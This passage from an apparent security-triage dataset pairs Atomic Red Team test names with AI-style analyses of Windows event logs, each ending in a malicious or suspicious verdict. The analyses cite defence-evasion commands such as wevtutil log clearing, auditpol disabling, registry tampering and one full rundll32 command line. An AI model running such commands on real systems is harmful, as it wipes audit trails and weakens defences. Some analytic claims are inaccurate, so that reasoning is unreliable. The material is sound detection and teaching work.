   - These operations are performed by the user `SERVER002\admin_test`, and the command lines indicate the usage of the `clear log` (`cl`) command.
   - Clearing of logs is a potential indicator of malicious activity, as this is often used by attackers to cover their tracks after performing unauthorized actions.

2. **Unusual Command-Line Execution**:
   - There is an instance where `cmd.exe` is invoked to execute `msiexec.exe` with a `/y` flag and specifying a `DLL` located in a temporary directory related to Atomic Red Team tests.
   - This might indicate a test/simulated attack or the execution of potentially unauthorized code.

3. **Simultaneity and Sequence**:
   - The events related to log clearing and suspicious command executions are occurring within very close temporal proximity (all within a second), which is unusual and indicates automated or scripted actions rather than typical administrative tasks.

### Indicators of Malicious Activity
- **Log Clearing:**
  Clearing logs, especially in crucial event channels like `Security`, `System`, `PowerShell`, and `Sysmon`, strongly suggests an attempt to hide traces of previous actions, which is a tactic commonly associated with malicious behavior.
  
- **Execution of Potentially Malicious Commands:**
  The `msiexec.exe` command execution with a non-standard install location and a `/y` flag is uncommon in typical administrative tasks, potentially indicating malicious activity or security testing without proper knowledge from the security team.

### Clear Assessment
The logs indicate actions that are not typical of routine administrative tasks. The use of `wevtutil.exe` for clearing logs and the execution of suspicious command lines point towards an effort to obfuscate actions or test security measures.

### Guidance and Resolution
- **Immediate Action:**
  - Investigate the user account `SERVER002\admin_test` and check if these actions were authorized or correspond to scheduled and approved testing (such as a penetration test).
  - Verify with IT and security teams to determine if these commands were part of a planned activity.
  
- **Long-term Action:**
  - Adjust monitoring rules and review auditing policies to alert and capture details of activities involving log clearing and execution of potentially harmful commands.
  - Enhance security awareness training if this is identified as an internal user testing security boundaries without proper authorization.

Resolution: **SUSPICIOUS** - Given the indications of potential malicious activity or unapproved testing, further investigation is warranted to confirm the legitimacy and intent of these actions."
Create and Hide a Service with sc.exe,"Upon analyzing the provided logs, several indicators of potentially suspicious and malicious activity have been identified:

1. **Event Log Clearing**: There are multiple instances where the event logs, specifically the ""Application"", ""System"", and ""Security"" logs, have been cleared by the user ""admin_test"" on `Server002`. Clearing event logs is a common tactic used by attackers to cover their tracks and remove evidence of their activities. Events with IDs 1102 (Security log cleared), 104 (System log cleared), and 104 (Windows PowerShell log cleared) highlight this activity (as seen in the Security and System logs).

2. **Privilege Escalation**: The user ""admin_test"" was observed having privileges related to SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, and other high-impact privileges (event ID 4672 in the Security logs). This is indicative of a potentially compromised account with elevated privileges which could lead to unauthorized access and escalation.

3. **Unusual Command Execution**: The Sysmon logs show the execution of commands to manipulate Windows services, such as creating a service named ""AtomicService"" that points to ""C:\Windows\System32\calc.exe"" (commonly exploited as part of service abuse attacks). This is indicative of malicious activity, especially when combined with the logs being cleared afterward:
   - Cmd.exe is used to create a service with `sc.exe` pointing to the calculator (calc.exe) - a known technique for service creation abuse.
   - The command line used suggests a potential exploitation of Windows services for unauthorized execution of code.

4. **Process Execution for Cover-Up or Attack Setup**: There is a pattern of execution involving ""wevtutil.exe"" and ""conhost.exe"" which seem to be part of log clearing operations. These processes are commonly used for clearing event logs and handling console applications respectively, which aligns with the observed event log clearing behavior.

5. **Time Discrepancies**: There is a recorded event adjusting the system time backward. Tampering with system time to manipulate event timelines is often used to evade detection systems or obfuscate activities.

6. **Multiple Logons with Elevated Privileges**: The ""admin_test"" account is observed in multiple logon events with elevated privileges over a short timescale (events 4624 and 4672), which is unusual and may indicate credential misuse or compromise.

In conclusion, the provided logs indicate **MALICIOUS** activity. Evidence of event log clearing, privilege escalations, suspicious process creation (particularly the use of system tools for unauthorized actions), and potential time manipulation strongly suggest that malicious operations were attempted or succeeded.

**Guidance on How to Proceed:**
- **Immediate account review**: Investigate the ""admin_test"" account for any unauthorized access or unusual activities. Reset the credentials and privileges if unauthorized access is confirmed.
- **Forensics and Containment**: Conduct a thorough forensic analysis on ""Server002"" to identify any additional suspicious activities that might not have been captured in these logs. Consider isolating the server to prevent further unauthorized activity.
- **Log Restoration**: Attempt to restore logs from backups (if available) to backtrack the original malicious actions.
- **Incident Response**: Activate the incident response plan to mitigate any potential breaches and prevent future occurrences.
- **Monitor and Review**: Continuously monitor for similar suspicious activities across the network and evaluate the security policies to prevent log tampering and improve detection capabilities."
Enabling Restricted Admin Mode via Command_Prompt,"Upon reviewing the provided Windows event logs, I have identified several events that bear signs of potential malicious activity. Below is the detailed analysis:

1. **Event Log Clearance (Security Log ID 1102 and System Log ID 104):**
   - **Event ID 1102:** The Security log indicates that the event log was cleared by a user `admin_test`. Clearing security logs can indicate an attempt to remove traces of malicious activity or unauthorized access. 
   - **System Log ID 104:** Logs for the System and Windows PowerShell channels were also cleared by the same user `admin_test`. This reinforces the suspicion of malicious activity, as clearing multiple logs is a common tactic used to cover tracks after unauthorized activities.

2. **Suspicious Process Execution (Sysmon Log):**
   - Multiple entries show the execution of `wevtutil.exe` with the `cl` (clear) command (Sysmon Event ID 1, processes 2120, 2888, 3080, and others), which correlates with the event log clearance. This command-line activity is suspicious as it directly relates to clearing logs.
   - **Registry Modification (Sysmon Event ID 1, Process ID 6876):** The `cmd.exe` process executed a command to modify the registry key `HKLM\System\CurrentControlSet\Control\Lsa` to add `DisableRestrictedAdmin`. This action is indicative of privilege escalation or persistence mechanisms being deployed.

3. **Time Manipulation Events (Security Log ID 4616 and System Log ID 1):**
   - Events changing the system time were recorded. Time adjustments can be used by attackers to confuse incident detection or logging systems, especially when aligned with log-clearing activities.

4. **Microsoft Edge Update Processes:**
   - Numerous Microsoft Edge Update processes running at a system level. This pattern by itself isn't inherently malicious but should be checked against the update schedule policy, especially if the system isn't due for an update.

### Assessment and Resolution

- **Threat & Risk:**
  - The combination of log clearance, registry modification to potentially weaken security settings, and time manipulation events are strong indicators of malicious intent. These activities suggest an attempt to cover tracks and possibly strengthen unauthorized control over the system.

- **Guidance:**
  - Conduct a thorough investigation of the `admin_test` account to verify its legitimacy.
  - Analyze the origins of the commands executed, especially those involving `wevtutil.exe` and registry modifications.
  - Review system update configurations and logs for anomalies with the Microsoft Edge update processes, even if not yet definitive.
  - Utilize system backups or forensic tools to attempt log reconstruction for a more comprehensive threat analysis.

Based on this analysis, the log events align with an assessment of **MALICIOUS** activity. Immediate containment and further forensic investigation are recommended to prevent potential security breaches."

2. **System Time Change**:
   - Event ID 4616 shows a change in system time. Changing system time can be used to undermine scheduled system tasks and logs or to mislead security monitoring.

3. **Windows Event Utilities Execution**:
   - Multiple executions of `wevtutil.exe` have been logged, which were used to clear specific logs (Application, Security, and System). This can be suspicious, particularly if done without authorization, as it might suggest malicious activities trying to cover tracks.

4. **Unexpected Commands in High Integrity Context**:
   - The execution of potentially dangerous command-line utilities such as `cmd.exe` with `hh.exe` fetching a file from the web: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm`, suggests the download and potential attempt to execute a payload, which is highly indicative of malicious intent.

5. **High Privilege Tokens and Access**:
   - Event IDs 4672 and 4624 show admin-level accounts accessing and using high privilege tokens like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others which might be used for privilege escalation if misused.

6. **PowerShell with Restricted Execution Policy**:
   - Multiple PowerShell activities are logged with the `-ExecutionPolicy Restricted` flag, alongside potentially harmful commands, indicating attempts to run scripts which might be restricted by default policy settings.

Based on the activities observed, especially the clearing of logs and command execution patterns, there is strong evidence suggesting nefarious actions are present in the logs.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediate attention should be given to this server to isolate it from the network to prevent any potential spread of malicious actions.
- Review and investigate any suspicious accounts and their recent activities, especially `admin_test`.
- Conduct a thorough forensic analysis on the system to determine the full scope of the compromise, utilize backups, and implement stricter monitoring.
- Consider enhancing security policies, such as implementing a stricter logging policy and access control fortifications to prevent unauthorized log clearing and anomalous command executions."
Rundll32 with Control_RunDLL,"### Analysis Summary

Upon reviewing the provided Sysmon, Application, Security, and System event logs, several indicators of suspicious and potentially malicious activities were identified:

1. **Use of `wevtutil.exe` and Event Log Clearing:**
   - Multiple invocations of `C:\Windows\System32\wevtutil.exe` with the ""cl"" flag targeting various logs such as Microsoft-Windows-Sysmon, Application, System, Security, and Windows PowerShell. The pattern suggests an attempt to clear or tamper with multiple logs (Event IDs 17961, 17965, 17969, 17973, and 17977).
   - Corresponding with these entries, the Security log (Event Record ID 30353) shows an EventID 1102 which indicates the Security log was cleared by user `admin_test`.
   - System log entries show that System and Windows PowerShell channels were also cleared by `admin_test` (Event IDs 3571 and 3572).

2. **Execution of Suspicious DLL via rundll32.exe:**
   - The log entries show `cmd.exe` executing `rundll32.exe` to run a DLL file: `calc.dll` from a suspicious directory path linked to Atomic Red Team (Event Record IDs 17989 and 17991).
   - The command used: `""cmd.exe"" /c rundll32.exe shell32.dll,Control_RunDLL ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1047\\bin\\calc.dll""` is suspicious as `rundll32.exe` is often misused for executing arbitrary DLLs.

3. **High Integrity Processes and Consistent Use of PowerShell:**
   - Consistent use of PowerShell with high integrity levels logged as being run by `admin_test` could suggest privilege escalation or preparation for additional script-based payloads or commands (Event IDs 17959).

4. **Execution from Temporary or Non-standard Directories:**
   - Executing tools like `whoami.exe`, `hostname.exe`, and other administrative tools from a non-administrative path such as `C:\\Users\\admin_test\\Documents\\` or similar directories often signifies possible lateral movement or system reconnaissance performed by a script or a threat actor (Event IDs 17985, 17981).

5. **General Software Update Activities:**
   - A large number of entries related to Microsoft Edge Update processes seems consistent with a software update cycle (Event Record IDs 18007, 18010, 18014). However, these are less of concern unless correlated with other anomalies.

### Conclusion

**Resolution: MALICIOUS**

The evidence of systematic event log clearing coupled with the execution of a DLL through `rundll32.exe` strongly suggests malicious activity. These actions are consistent with attempts to cover tracks and execute unauthorized code. There are also indications of potential misuse of legitimate administrative tools to probe the system or clear logs, typical behavior seen in post-exploitation phases of attacks.

Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell,"Based on the investigation of the provided logs, several aspects stand out as suspicious activities that warrant further investigation:

1. **Event Log Clearing:**
   - We observe multiple instances of the `wevtutil.exe` command being used to clear event logs, specifically the Sysmon, Application, System, Security, and Windows PowerShell logs. This is typically indicative of an attempt to cover tracks after malicious activity on a system. The clearing of logs is done by the user ""admin_test"", which highlights a potential insider threat or compromised account.

2. **PowerShell Scripts Modifying Registry Keys:**
   - The PowerShell logs indicate the execution of a script that sets registry values for 'http' and 'https' protocols to '0'. This modification can potentially cause default protocol restrictions, affecting network communication and possibly warranting further investigation for malicious intent or misconfiguration.

3. **Use of `whoami.exe` and `hostname.exe`:**
   - The execution of commands like `whoami.exe` and `hostname.exe` could be part of standard operations or for enumeration purposes by an attacker to gather information about the system and the logged-on user. However, these by themselves are not necessarily malicious unless correlated with other suspicious activities.

4. **Edge Update Processes:**
   - Numerous processes related to Microsoft Edge Update are noted. While frequent updates could be routine, the high volume of Edge-related activity, including updates and COM registration, all within a tight timeframe, might require verification to confirm they were initiated by legitimate scheduled tasks or from a trusted source.

5. **Time Change Activity:**
   - Events indicating changes to the system time were identified. These changes were executed by a process running as LOCAL SERVICE and could relate to routine system synchronization or be an attempt by an attacker to disrupt log timelines. Any timezone or time manipulation without proper justification can be suspicious and should be considered for deeper investigation.

**Recommendation and Assessment:**
- **Recommendation:**
  - Conduct a full audit trail and verify administrative activities for the account ""admin_test"" to rule out or confirm unauthorized access.
  - Analyze the network and registry changes, particularly focusing on protocol defaults set by PowerShell commands, and ensure they align with your organization's security policy.
  - Validate Edge Update activities through cross-referencing with legitimate update schedules or reviewing the components for any anomalies.
  - Check for any other anomalous behaviors or indicators of compromise across the host and linked accounts.

The observed activities, particularly the clearing of logs and the suspicious registry modifications using PowerShell, suggest an attempt to obfuscate actions on the systems and possibly indicate malicious intent.

**Resolution: SUSPICIOUS**

The logs demonstrate suspicious activities that require further investigation to rule out potential security incidents and ensure the integrity of the involved systems and accounts."
Disable Windows Lock Workstation Feature,"Based on the detailed review of the provided logs, I have organized my findings as follows:

1. **Clearing of Event Logs:**
   - The Sysmon and Windows Event logs highlight that the system's Security, System, and Windows PowerShell logs have been cleared by the user `admin_test`. This action is captured in both the Security log with Event ID 1102, and in the System log with Event ID 104. Typically, the clearing of event logs, especially without an accompanying backup path, can be indicative of malicious intent, as it may be an attempt to hide tracks of activities conducted on the system.

2. **Unusual Command Execution:**
   - There is a series of commands executed using `wevtutil.exe` to clear logs for various channels, such as Microsoft-Windows-Sysmon, Application, Security, etc. This is evident from multiple entries where `wevtutil.exe` processes are spawned by `wsmprovhost.exe` with high integrity level. Running `wevtutil.exe` to clear event logs, particularly within such a short timeframe and in conjunction with other suspicious activities, raises red flags.

3. **Modification of Registry:**
   - There is a command-line entry showing `cmd.exe` executing a registry modification to add a registry key `DisableLockWorkstation`. This action suggests an attempt to alter system behavior to prevent users from locking their workstations, which could theoretically facilitate unauthorized access or persistence by an attacker.

4. **Usual processes:**
   - Many processes and activities appear normal and are related to system updates and Microsoft Edge updating processes. Processes executed by the `NT AUTHORITY\SYSTEM` user for Edge Update activities are typical system scheduled maintenance activities and not inherently malicious.

**Assessment:**
- The logs highlight several actions that, while not explicitly indicative of compromise, suggest a pattern of behavior that is consistent with an attempt at covering tracks. Clearing logs and making unauthorized registry changes are notable signs of malicious activity. The timing and sequential execution of these functions further align with behaviors seen in suspicious activities.

**Resolution:**
- **MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Conduct further investigation into the user `admin_test` and review access controls to determine if this behavior is within expected responsibilities and tasks.
   - Verify other systems this user accesses to see if similar activities occur elsewhere.
   - Enable increased monitoring of the system and user activities.

2. **Remediation:**
   - Conduct a thorough security audit of the affected systems.
   - Consider quarantining the host until the extent of the compromise is assessed.
   - Reset credentials and ensure MFA is enabled for `admin_test`.

3. **Preventive Measures:**
   - Implement strict logging policies and ensure security logs are backed up before allowing them to be cleared.
   - Limit users who have permission to clear event logs and conduct regular reviews of such actions.
   - Enhance user awareness and training regarding suspicious and unauthorized system changes.

These findings and recommendations should be reviewed with your incident response team to determine concrete next steps tailored to your organization's security policies and risk appetite."
Regasm Uninstall Method Call Test,"### Analysis:

**Suspicious or Anomalous Behavior:**

1. **Log Clearing:**
   - The logs show consecutive log clearing events. The system logs (`EventID 104`), PowerShell logs (`EventID 104`), and security logs (`EventID 1102`) have all been cleared by the user `admin_test` in a very tight timeframe (`15:27:03`). This is often a tactic used by malicious actors to hide their traces after performing unauthorized actions or intrusions.

2. **Commands and Execution:**
   - The system shows a process execution of `wevtutil.exe` used with the `cl` (clear) command on several event logs, which aligns with the log clearing activity found in the system, application, and security logs. The user's actions included clearing important logs, potentially to obscure other activities.
   - A command was executed via `cmd.exe` linked to suspicious or improper use of `csc.exe`, `regasm.exe`, and handling files in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.009`). This may indicate a potential code execution or exploitation activity, especially considering the use of `AtomicRedTeam` paths, often related to testing or simulating attack techniques.

3. **Process Execution:**
   - PowerShell and `wevtutil.exe` processes running along with privilege elevation to ""High"" and ""System"" integrity levels.
   - Numerous executions of `MicrosoftEdgeUpdate.exe` with various flags and operations, which while might be benign as part of Edge's self-update mechanism, could also hide malicious updates or downloads if not verified against legitimate activity metrics.

**Potential Indicators of Malicious Activity:**

- The clearing of system-related logs is a strong indicator of malicious activity, as it generally aims to diminish auditing capabilities.
- Using scripts or commands that register or unregister DLLs, especially in combination with temp directories and the `cmd.exe`, may suggest an attempt to execute persistence techniques or evasion.

### Assessment of the Situation:

The evidence of multiple critical log clearances coupled with processes indicative of possible post-exploitation activities (use of wevtutil, non-standard command line use of .NET tools) raises serious concerns about the integrity of the server at the time of these events. The presence of the Atomic Red Team directory and executable usage further hints at potential attack simulation activities, which, without explicit authorization, can be defined as suspicious or malicious.

### Resolution:

Based on the log analysis, the activities found are highly suspicious, particularly due to the intentional log clearance and the execution of commands that align with known tactics used in attack simulations or real attacks. Further investigation is recommended to confirm the nature of these events and verify whether they were permitted testing scenarios or actual illicit activities.

Resolution: **SUSPICIOUS** - The logs contain activity that doesn't look right and warrants further investigation."
Disable Windows Task Manager application,"After analyzing the provided Windows event logs, I've determined several key points of concern that require attention:

### Suspicious/Anomalous Behavior:
1. **Log File Clearing (Security Event ID 1102):** 
   - The security log contains an event where the logs were cleared by the user ""admin_test"". This is a potentially suspicious action as attackers often clear logs to cover their tracks.
  
2. **Registry Modification (Sysmon Event ID 1):** 
   - A command was executed using `cmd.exe` to modify the registry under the path `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System` with the key `DisableTaskmgr`. This can be indicative of malicious activity aiming to disable the Task Manager, a technique sometimes used by malware to prevent termination of malicious processes.

3. **Event Log Clearing (Sysmon Events):**
   - Multiple instances of `wevtutil.exe` were logged, which was used to clear various event logs like Sysmon, Application, System, and Security logs. The clearing of logs, especially in conjunction with the above registry modification, is considered highly suspicious.

4. **Time Discrepancy (Security Event ID 4616):**
   - There are events indicating that the system time was adjusted backward slightly. Time adjustments can sometimes be used to manipulate timestamps within logs, although this by itself may not always indicate malicious activity.

5. **EdgeUpdate Activity (Numerous Sysmon Events):**
   - There is extensive logging related to `MicrosoftEdgeUpdate.exe`, although its lineage and seemingly excessive activity could tie into typical application maintenance, but together with the clearing and modification actions, these logs need further examination.
   
### Malicious Indicators:
- The combination of clearing logs, registry tampering, and time adjustment strongly suggests attempted obfuscation and potential compromise.
  
### Threat Assessment:
- The actions performed, especially regarding the clearing of logs, combined with disadvantaging system administration utilities (Task Manager), and potential time manipulation, indicate likely malicious activity.

### Resolution:
- **MALICIOUS**: The collected evidence suggests intentional behavior to conceal actions on the host, likely indicative of an intrusion or policy violation.

### Guidance:
1. **Immediate Response:**
   - Isolate the affected host to prevent potential spread or further compromise.
   - Conduct a comprehensive forensic investigation to determine the extent of the breach.
   - Collect and preserve all available logs and system states for detailed analysis and potential legal action.

2. **Remediation Steps:**
   - Review and assess all system changes, especially those related to security configurations.
   - Reset all credentials that were accessible from the host to prevent unauthorized control.
   - Ensure all patches and security updates are applied to prevent exploitation of known vulnerabilities.

3. **Long-term Actions:**
   - Strengthen monitoring capabilities to detect similar activities in the future.
   - Implement stricter access controls and policies relating to log management and system adjustments.
   - Consider additional employee training on security policies and potential red flags.

This suspicious activity merits further investigation in coordination with IT and security teams to ensure the security posture is restored, and all vulnerabilities exploited are mitigated."
Do Not Connect To Win Update,"Upon carefully analyzing the provided Windows event logs from a variety of sources, several indicators suggest suspicious or potentially malicious activity. Here is a detailed breakdown of findings:

1. **Log Clearing Events**: 
   - We observe multiple events with EventID 104 in the ""System"" log indicating that logs for ""System"" and ""Windows PowerShell"" channels were cleared by a user with the username ""admin_test"".
   - In the ""Security"" log, an EventID 1102 indicates that the audit logs were also cleared.
   - The act of clearing logs can often be associated with attempts to cover tracks of malicious activity, especially when performed shortly before or after unusual or unauthorized operations.

2. **Execution of Utilities**:
   - Several instances of `wevtutil.exe` execution are noted in the ""Sysmon"" log (EventID 1). This utility is typically used to manage Windows event logs, including clearing them, which correlates with the log clearing events. The execution of `wevtutil.exe` with the command to clear logs (`cl`) is explicit and confirms tampering or attempts to remove traces.
   - The frequent execution of `conhost.exe` and `whoami.exe` does not inherently signal malicious activity, but in combination with aggressive log clearing, it can be correlated with scripting actions or commands intended for reconnaissance (gathering user information) or automated execution.

3. **Registry Modification**:
   - There is a `cmd.exe` process executed with a command to modify the registry (`reg add`) to potentially disable Windows Update connections (specifically the entry for `DoNotConnectToWindowsUpdateInternetLocations`). Registry modifications can often signal unwanted configuration changes, possibly to prevent system updates which could patch vulnerabilities being exploited by an attacker.

4. **Time Manipulation**:
   - The ""Security"" log shows an EventID 4616, indicating system time change activities. While `svchost.exe` is commonly and legitimately involved in such operations, time alteration alongside the clearing of logs might be used to obfuscate the timing of activities or align timestamps to mislead analysis.

5. **Command Execution Context**:
   - The user context for most actions is `SERVER002\admin_test`, suggesting a privileged account was used. This aligns with concerns around insider threat activities or compromised credentials being used to execute malicious operations.

### Assessment & Guidance

Based on the presented logs and actions, there is clear evidence of unusual and suspicious activity indicative of potential malicious intent:
- The deliberate clearing of various logs suggests a strong attempt at covering tracks.
- The use of command-line utilities to alter system configuration and disable updates further supports the suspicion of compromise.
- The frequent use of administrative commands and context of high integrity running reveal a threat actor potentially using elevated access for malicious purposes.

**Resolution: MALICIOUS**

### Recommended Actions Forward:
- **Immediate Incident Response**: Engage the incident response team to further investigate and contain the threat. This might include taking the affected systems offline.
- **Credential Verification**: Investigate the ""admin_test"" account for unauthorized access or indicators of compromise.
- **System Review**: Thoroughly inspect registry keys, running processes, and scheduled tasks to identify persistence mechanisms.
- **Monitoring & Alerts**: Enhance monitoring for similar log clearing and registry modification activities across the environment and set up alerts for these patterns.
- **Forensic Analysis**: Perform detailed forensic analysis on the affected systems to recover any cleared logs and understand the extent of the compromise.

This comprehensive analysis highlights the need for swift action to prevent further exploitation and mitigate potential damages."
File Extension Masquerading,"Upon reviewing the provided Windows event logs across various log categories, I've identified several key indicators and concerns that suggest potential malicious activity:

1. **Log File Clearance**: 
   - Multiple events indicate that log files were cleared. The `wevtutil.exe` utility, which is used to manipulate event logs, was executed several times (`EventID: 1102` in Security log, and similar in Sysmon log). The user `admin_test` executed these commands. Log clearance can often be an attempt to cover tracks after malicious activity.

2. **Suspicious PowerShell Execution**:
   - Several PowerShell events (`EventID: 600`) captured the execution of scripts named in the form of `T1036.003_masquerading.[file extension].ps1`. The path suggests these scripts might be attempts to masquerade as legitimate documents. These are executed from a temporary directory which is atypical for standard legitimate scripts.

3. **Command Execution and File Copies**:
   - There is an execution of `cmd.exe` with a complex command line that involves copying `calc.exe` (Windows Calculator) to temporary directories with disguised extensions like `.docx.exe`, `.pdf.exe`, and execution of PowerShell scripts. This pattern is commonly seen in techniques used to obfuscate or masquerade malware payloads and can indicate the presence of malware using standard Windows components for execution.

4. **Privileged Processes**:
   - The logs contain multiple instances of processes run with system-level privileges, including `svchost.exe` processes with various command-lines typical of legitimate Windows operation but can also be used for privilege escalation or persistence mechanisms if executed maliciously.

5. **Unusual Activity Correlation**:
   - The timing and sequence of events, especially around the moments of PowerShell script execution, log clearance, and file execution in the temp directories, correlates with behaviors commonly associated with malicious activity.

**Assessment Conclusion: MALICIOUS**

Based on these observations, the actions are highly indicative of a compromise involving PowerShell scripts likely designed to evade detection, log clearance possibly to hide traces, and the deployment of potentially malicious payloads masquerading as common document types.

**Recommendations:**

1. **Immediate Containment**: Isolate `Server002` from the network to prevent further potential spread or communication with any C2 (command and control) servers.
2. **Forensic Investigation**: Conduct a deeper forensic analysis on the affected server. Collect memory dumps, analyze suspicious files (`T1036.003_masquerading` scripts), and confirm any communication with external IP addresses.
3. **Review and Hardening**: Review and enhance log retention policies and monitoring systems. Implement alerting for the execution of scripting utilities in temp directories and any instance of log file clearance.
4. **User Auditing**: Monitor the activities of 'admin_test' and other privileged accounts for signs of further unauthorized activity.

These steps will help mitigate current threats and enhance future detection and prevention of similar incidents."
Register Portable Virtualbox,"Upon careful analysis of the provided logs, there are several aspects that indicate suspicious and potentially malicious activity:

1. **Clearing of Event Logs:**
   - The Security log shows Event ID 1102, which indicates that the Security log has been cleared by the user `admin_test` (S-1-5-21-3962163828-2803415714-1403596700-1006). Similarly, System logs with Event ID 104 indicate that `admin_test` cleared the System channel.
   - Clearing logs is often an indication of an attempt to hide malicious activity, as attackers commonly clear logs to cover their tracks.

2. **Unusual PowerShell Activity:**
   - There is a PowerShell event (EventID 403) showing the execution of potentially suspicious PowerShell commands related to downloading a file named ""common.cab"" from a GitHub repository associated with Atomic Red Team's T1564.006 technique, which is designed to test and demonstrate various techniques including defensive evasion.
   - The use of PowerShell to download files from GitHub and the exploration of Atomic Red Team techniques could suggest either a security assessment being run without prior notification or potential malicious activity.

3. **Wevtutil Commands:**
   - Multiple instances of `wevtutil.exe` are running commands to clear logs such as Microsoft-Windows-Sysmon/Operational, System, and Security logs.
   - The use of `wevtutil cl` to clear logs can be a strong indicator of an effort to erase records of malicious actions.

4. **Start of Uncommon Services and Processes:**
   - The creation and starting of a service named ""VBoxDRV"" by `cmd.exe` suggests the potential installation of VirtualBox or related software in a command and potentially unauthorized manner.
   - The use of `sc.exe` commands to modify or start services may indicate an attempt to maintain persistence or escalate privileges.

5. **Miscellaneous Process Activities:**
   - There are various instances of `cmd.exe`, `conhost.exe`, and `sc.exe` activities that occur in proximity to the log clearing events. 
   - This behavior can represent attempts to perform additional modifications or configurations post-attack initial access or as a part of an exploitation process.

**Assessment:**
Given the combination of multiple log clearing events, the presence of PowerShell script execution downloading files from external sources, and services modifications, it is highly indicative of malicious activity. The actor might be attempting to evade detection or perform unauthorized operations within the machine.

**Resolution: MALICIOUS**

**Guidance on Proceeding:**
- Immediate steps should include isolating the affected host to prevent further unauthorized access.
- Conduct a full forensic analysis of the affected system to determine the extent of the compromise.
- Review network logs to identify potential lateral movement or external communications.
- Consider resetting credentials related to the `admin_test` account and any other compromised accounts.
- Collaborate with incident response teams to determine next steps and identify additional security measures to prevent recurrence."
Impair Windows Audit Log Policy,"Upon analysis of the provided Windows event logs, the following observations have been made that indicate suspicious and potentially malicious activity:

1. **Use of `auditpol` Command:**
   - The log entries show the execution of the `cmd.exe` process with command-line arguments that include `auditpol` commands used to disable auditing across several categories (e.g., ""Account Logon"", ""Logon/Logoff"", ""Detailed Tracking"") for both success and failure. This is often seen in activities attempting to evade detection by reducing the amount of logging and auditing information available.

2. **Cleared Event Logs:**
   - The system, Windows PowerShell, and security logs have experienced clearing events, as indicated by EventID `104` for System and PowerShell logs and EventID `1102` for Security logs (`LogFileCleared`). The user responsible here is `admin_test`. Clearing logs is a common tactic used by attackers to cover their tracks after malicious actions have been performed.

3. **Privilege Escalation and High Integrity Processes:**
   - Processes like `whoami.exe`, `wevtutil.exe`, and others run with high integrity, suggesting running with elevated privileges. While not inherently malicious, the context of their usage suggests they might be part of a larger suspicious activity.

4. **Excessive Use of System Utilities:**
   - The frequent and automated use of utilities such as `wevtutil.exe`, `conhost.exe`, and `cmd.exe` in short succession can indicate scripted or automated attempts at information gathering, system configuration checks, or manipulations. This behavior deviates from typical administrative activity, especially without any immediate or logical context of troubleshooting or system maintenance tasks being logged.

5. **EdgeUpdate Service and Operations:**
   - Although the `EdgeUpdate` service and its related processes show activities typical for software updating tasks, this domain has been frequently leveraged in some compromised environments to launch or hide malicious activity. It's essential to cross-reference this behavior against known update schedules or administrative actions.

Based on the identified patterns indicative of potential security breaches, the logs can be classified into the following resolution:

- **Resolution: MALICIOUS**

**Assessment and Guidance:**
- The actions noted, particularly disabling auditing through `auditpol` and clearing event logs, strongly suggest an attempt to stealthily conduct operations on the host.
- Immediate containment actions are recommended, such as isolating the host from the network to prevent further possible exfiltration or lateral movement.
- Conduct a deeper forensic analysis on the affected machine to identify any unauthorized changes made or persistence mechanisms established by the attacker.
- Review user account activity, especially the `admin_test` user, and validate all associated permissions and access rights.
- Enhance monitoring and consider re-enabling any disabled auditing policies once the host’s integrity is assured.
- Assess and reinforce the security posture, potentially improving logging, user behavior analytics, and threat detection mechanisms to prevent future occurrences."
Delete an entire folder - Windows cmd,"**Analysis of Logs:**

1. **Log Cleared Events:**
   - In the provided system, security, and application logs, there are multiple instances of log files being cleared (`EventID 104` for system logs and Windows PowerShell, and `EventID 1102` for security logs). Clearing log files is often an indication of someone attempting to hide their tracks after conducting malicious activities. This is particularly suspicious when done without an apparent legitimate reason.

2. **Suspicious Command Execution:**
   - Several instances of `wevtutil` command executions appear in the Sysmon logs. The use of `wevtutil` to clear logs (`wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, etc.) is consistent with attempts to cover malicious activity tracks.
   - There are batch commands to create and delete temporary directories under `%temp%\\deleteme_T1551.004`, which may indicate preparation and cleanup routines often seen in malicious scripts or operations.

3. **Tool Ingress:**
   - Execution of tools like `whoami`, `hostname`, and the batch commands in quick succession can be indicative of reconnaissance activity. These are benign on their own but suspicious given the context of log clearings.
  
4. **Integrity Level:**
   - Several processes have an ""Integrity Level"" set to ""High"", indicating execution with elevated privileges, which is typical for malware to gain control over a system.

5. **Parent-Child Relationship:**
   - The parent process for many suspicious activities is `wsmprovhost.exe`, which is used in Windows Management Instrumentation (WMI) operations. The context could suggest exploitation via WMI, which might not be typical in non-administrative tasks.

**Conclusion and Recommendation:**

Given the combination of log clearing, suspicious command lines, high integrity level processes, and rapid sequential execution of reconnaissance and log management commands, these logs contain **indicators of malicious activity**. This appears to be an attempt to perform actions while hiding tracks, typically seen in scenarios involving a breach or compromise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediate isolation of the affected host (Server002) to prevent any further potential compromise.
- Thorough forensic analysis to determine any unauthorized access or data exfiltration.
- Review and enhance log monitoring settings to detect similar activities in the future.
- Ensure all systems are updated and patched, particularly focusing on vulnerabilities that may have been exploited.
- Conduct a company-wide security assessment to ensure proper security protocols are followed and to educate users on recognizing suspicious activities.

**Note:** Given the high probability of compromise, coordination with legal and compliance departments may be necessary to determine the next steps, including potential notification obligations."
Lolbin Jsc.exe compile javascript to dll,"Upon analysis of the provided Windows event logs, several events stood out as potentially suspicious and indicative of malicious activity. Here is a detailed breakdown:

1. **Log Clearing:**
   - **Event ID 104 (System Log Cleared)** entries indicate that logs for multiple channels (System, Windows PowerShell) were cleared by the user `admin_test`. This action, while it can occur for legitimate reasons, is often seen in malicious activity for attackers attempting to cover their tracks.

2. **Suspicious Process Execution:**
   - **Event ID 1102 (Security Log Cleared)** within the Security channel shows the Security log being cleared by the same user, `admin_test`. This is highly suspicious if not part of routine, authorized administrative activity.
